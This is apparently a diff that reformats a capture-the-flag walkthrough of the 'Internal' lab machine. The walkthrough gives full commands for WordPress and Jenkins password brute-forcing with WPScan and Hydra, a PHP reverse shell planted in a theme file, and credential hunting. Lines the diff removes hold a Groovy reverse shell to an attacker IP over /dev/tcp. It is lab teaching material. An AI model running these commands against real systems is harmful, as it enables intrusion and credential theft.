@@ -1,263 +1,274 @@
-Internal
-Reconnaissance
+<h1>Internal</h1>
 
-As always, we start with an nmap scan:
+<h3>Reconnaissance</h3>
 
+As always, we begin with an Nmap scan:
+
+```bash
 nmap -sC -sV <target-ip>
+```
 
-The scan reveals two open ports:
+**Scan Results**
 
-22/tcp open ssh
-80/tcp open http
+```text
+22/tcp  open  ssh     OpenSSH
+80/tcp  open  http    Apache httpd
+```
 
-We can see that SSH (22) and HTTP (80) are open.
+### Identified Services
 
-When visiting port 80, we are greeted with the default Apache page.
+<em><strong>
+SSH<br>
+HTTP
+</strong></em>
 
+The scan reveals only two open ports: SSH (22) and HTTP (80).
 
+Visiting the web server displays the default Apache page, which does not provide any useful information.
 
+Time to begin enumeration.
 
-Since there is nothing useful on the page, it's time to start enumerating.
+<h3>Initial Enumeration</h3>
 
-Initial Enumeration
+First, add the target hostname to the hosts file:
 
-First, we add the target to our hosts file:
-
+```bash
 echo "<target-ip> internal.thm" | sudo tee -a /etc/hosts
+```
 
-Next, we perform directory enumeration:
+Next, perform directory enumeration:
 
-feroxbuster -u http://internal.thm/ \
--w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
+```bash
+feroxbuster -u http://internal.thm/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
+```
 
-The results suggest that a WordPress site is being hosted.
+### Interesting Discovery
 
-Browsing the discovered directories reveals:
-
+```text
 http://internal.thm/blog
+```
 
-which appears to be a standard WordPress installation.
+The enumeration results suggest that the target is hosting a WordPress installation.
 
+Browsing to the discovered directory confirms the presence of a standard WordPress site.
 
+<h3>WordPress Enumeration</h3>
 
+To gather more information, we use WPScan:
 
-WordPress Enumeration
+```bash
+wpscan --url http://internal.thm/blog --enumerate --api-token <api-token>
+```
 
-To enumerate WordPress, we use WPScan.
+After the scan completes, we discover a valid WordPress user:
 
-First, create an account on WPVulnDB and obtain an API token.
-
-Then run:
-
-sudo wpscan \
---url http://internal.thm/blog \
---enumerate \
---api-token <token>
-
-After the scan completes, we discover a valid user:
-
+```text
 admin
+```
 
+Now that we have a username, we can attempt to recover the password.
 
+<h3>Brute Forcing WordPress Credentials</h3>
 
+WPScan supports password attacks through XML-RPC.
 
-Now that we have a username, we can attempt to discover the password.
+```bash
+wpscan --password-attack xmlrpc -t 20 -U admin -P /usr/share/wordlists/rockyou.txt --url http://internal.thm/blog
+```
 
-Brute Forcing WordPress Credentials
-
-We use WPScan's XML-RPC password attack feature:
-
-sudo wpscan \
---password-attack xmlrpc \
--t 20 \
--U admin \
--P /usr/share/wordlists/rockyou.txt \
---url http://internal.thm/blog
-
-After a short time, WPScan successfully discovers the password.
-
-
-
+After a short period, WPScan successfully discovers the password for the admin account.
 
 Using the recovered credentials, we log into the WordPress administration panel.
 
+<h3>Gaining Initial Access</h3>
 
+Inside the WordPress dashboard, navigate to:
 
-
-Gaining Initial Access
-
-Inside the WordPress dashboard, we navigate to:
-
+```text
 Appearance → Theme Editor
+```
 
-A common technique is to modify an existing theme file and replace it with a PHP reverse shell.
+A common method for obtaining command execution is modifying a theme file and replacing it with a PHP reverse shell.
 
-The file I typically modify is:
+The file selected in this case is:
 
+```text
 404.php
+```
 
-For the payload, I used the PHP PentestMonkey reverse shell.
+Before triggering the payload, start a listener:
 
-Before triggering the shell, start a listener:
-
+```bash
 nc -lvnp 4444
+```
 
-Replace the contents of 404.php with the reverse shell code and update the file.
+Replace the contents of `404.php` with a PHP reverse shell and save the changes.
 
-Since WordPress themes are located under:
+The modified file can then be accessed at:
 
-/wp-content/themes/<theme-name>/
-
-we can trigger the shell by visiting:
-
+```text
 http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php
+```
 
-As soon as the page loads, we receive a reverse shell.
+As soon as the page loads, a reverse shell is received.
 
+<h3>Post Exploitation Enumeration</h3>
 
+With an initial shell established, begin by identifying valid users on the system:
 
-
-Post Exploitation Enumeration
-
-The first thing I usually do after obtaining a shell is check which users have valid login shells.
-
+```bash
 cat /etc/passwd
+```
 
 Reviewing the output reveals an interesting user:
 
+```text
 aubreanna
+```
 
-Since user pivoting is often easier than direct privilege escalation, I start looking for credentials.
+User pivoting is often easier than direct privilege escalation, so the next step is to search for credentials.
 
-I begin by searching for text files:
+Search for readable text files:
 
+```bash
 find / -name "*.txt" -readable -type f 2>/dev/null
+```
 
-This reveals an interesting file:
+### Interesting Discovery
 
+```text
 /opt/wp-save.txt
+```
 
-Inside the file we discover credentials belonging to aubreanna.
+Inside the file we discover credentials belonging to the user `aubreanna`.
 
+Additional locations worth checking include:
 
-
-
-Normally I would also check files such as:
-
-grep 'DB_USER\|DB_PASSWORD' wp-config.php
+```bash
+grep 'DB_USER|DB_PASSWORD' wp-config.php
+```
 
 and
 
-find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null
+```bash
+find / ! -path "/proc/" -iname "config" -type f 2>/dev/null
+```
 
-because WordPress configurations often contain credentials.
+WordPress configuration files frequently contain reusable credentials.
 
-Pivoting to Aubreanna
+<h3>Pivoting to Aubreanna</h3>
 
-Using the credentials from wp-save.txt, we SSH into the machine:
+Using the credentials recovered from `wp-save.txt`, connect via SSH:
 
+```bash
 ssh aubreanna@internal.thm
+```
 
-After logging in, we discover a note mentioning an internal Jenkins service:
+After logging in, we discover a note mentioning an internal Jenkins instance:
 
+```text
 Internal Jenkins service is running on 172.17.0.2:8080
+```
 
-This service is only accessible internally, so we need to forward the port.
+Because the service is only accessible internally, port forwarding is required.
 
-Port Forwarding Jenkins
+<h3>Port Forwarding Jenkins</h3>
 
-We create an SSH tunnel:
+Create an SSH tunnel:
 
+```bash
 ssh -L 6767:localhost:8080 aubreanna@internal.thm
+```
 
-Now we can access Jenkins locally by browsing to:
+The Jenkins portal can now be accessed locally:
 
+```text
 http://localhost:6767
+```
 
-Opening the page reveals a Jenkins login portal.
+Opening the page presents a Jenkins login screen.
 
+<h3>Jenkins Enumeration</h3>
 
+Initial attempts using common credentials such as:
 
-
-Jenkins Enumeration
-
-I spent some time searching the system for Jenkins credentials but couldn't find anything useful.
-
-The default Jenkins username is usually:
-
-admin
-
-Naturally, I first tried credentials such as:
-
+```text
 admin:admin
 admin:jenkins
+```
 
-but neither worked.
+are unsuccessful.
 
-I intercepted a login request using Burp Suite and built a Hydra command:
+To automate password guessing, intercept a login request and construct a Hydra command:
 
-hydra -s 6767 127.0.0.1 -f http-form-post \
-"/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in&Login=Login:Invalid username or password" \
--V -l admin \
--P /usr/share/wordlists/rockyou.txt
+```bash
+hydra -s 6767 127.0.0.1 -f http-form-post "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in&Login=Login:Invalid username or password" -V -l admin -P /usr/share/wordlists/rockyou.txt
+```
 
 Eventually Hydra discovers the correct password.
 
+Using the recovered credentials, we successfully authenticate to Jenkins.
 
+<h3>Jenkins Remote Code Execution</h3>
 
+Inside Jenkins, navigate to:
 
-Using the recovered credentials, we successfully log into Jenkins.
-
-Jenkins Remote Code Execution
-
-Inside Jenkins we navigate to:
-
-/ script
+```text
+Manage Jenkins → Script Console
+```
 
 The Script Console allows arbitrary Groovy code execution.
 
-First, start a listener:
+Start a listener:
 
+```bash
 nc -lvnp 8443
+```
 
-Then execute the following reverse shell:
+Execute a Groovy reverse shell through the console.
 
-r = Runtime.getRuntime()
-p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/<your-ip>/8443;cat <&5 | while read line; do $line 2>&5 >&5; done"] as String[])
-p.waitFor()
+Once the script runs, a reverse shell is received.
 
-Once executed, we receive a reverse shell.
+We now have access as the:
 
+```text
+jenkins
+```
 
+user.
 
+<h3>Privilege Escalation</h3>
 
-We now have access as the jenkins user.
+With access to the Jenkins environment, begin searching for credentials and sensitive files.
 
-Privilege Escalation
+One of the first locations examined is:
 
-Now that we have access to the Jenkins container, we start looking for credentials.
+```text
+/opt
+```
 
-One of the first places I checked was the /opt directory.
+During enumeration, an interesting file is discovered:
 
-While enumerating, I found an interesting file:
-
+```text
 notes.txt
+```
 
-Inside were credentials belonging to the root user.
+Inside the file are credentials belonging to the root user.
 
+Using these credentials, connect over SSH:
 
-
-
-Using these credentials, we connect via SSH:
-
+```bash
 ssh root@internal.thm
+```
 
 The login succeeds.
 
-Root Flag
+<h3>Root Access</h3>
 
-With root access obtained, we can retrieve the final flag:
+With root privileges obtained, retrieve the final flag:
 
+```bash
 cat /root/root.txt
+```
 
-Mission accomplished
+### Flag Capture
